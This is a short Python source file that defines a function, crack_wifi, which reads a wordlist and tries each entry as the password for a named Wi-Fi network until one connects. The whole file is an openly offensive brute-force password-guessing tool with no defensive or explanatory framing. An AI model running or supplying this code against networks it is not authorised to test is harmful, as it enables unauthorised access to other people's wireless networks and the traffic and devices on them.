from wireless import Wireless

def crack_wifi(filename, ssid_of_target:str):
    print("\n[+] Starting Wifi password cracker")
    wire = Wireless()
    with open(filename, 'r') as file:
        for line in file.readlines():
            line = line.strip()
            if wire.connect(ssid=ssid_of_target.strip(), password=line) == True:
                print(f"[+] {line} - Success!")
                break
            else:
                print(f"[-] {line} - Failed!")